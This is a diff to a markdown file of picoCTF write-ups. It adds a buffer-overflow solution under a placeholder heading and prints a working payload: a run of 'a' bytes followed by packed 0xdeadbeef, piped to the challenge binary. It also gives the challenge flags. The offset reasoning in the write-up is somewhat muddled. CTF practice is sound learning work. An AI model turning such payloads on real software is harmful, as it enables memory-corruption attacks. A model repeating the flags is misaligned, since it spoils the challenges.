@@ -1,4 +1,3 @@
-
 # 1. buffer_overflow_0
 
 > Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
@@ -55,4 +54,37 @@ here unlike before we got `%s` in the 3rd option this unlike before will result 
 ```
 picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
 ```
+
+# 1. Challenge name
+
+> Put in the challenge's description here
+
+## Solution:
+
+This program has a gets function.In this we know the size of input buffer 256 bytes, if I pass 256 random things into the buffer we might be able to overflow it, so I do so with `python -c "a"*256` but still code is 0x00,maybe the codde buffer somewhere further so now  I pass 300 a's instead of 256 from where we get 
+```
+code == 0x6161616161616161
+code != 0xdeadbeef :(
+```
+then I tried 260 a's which resulted in 0x00 again but then I tried 265 wihch resulted in `0x61` and when I try 264 it again results in `0x00` which means code starts at 265, so we can overwrite it, i convert deadbeef to to little endian bytes by this : 
+```
+import pwn
+sth =  pwn.p64(0xdeadbeef)
+print(sth)
+```
+and copied it after the a's and then echoed it using this 
+```
+echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde\x00\x00\x00\x00" | ./chall
+```
+which then I did the same with nc version
+
+## Flag:
+
+```
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
+```
+
+
+***
+
 
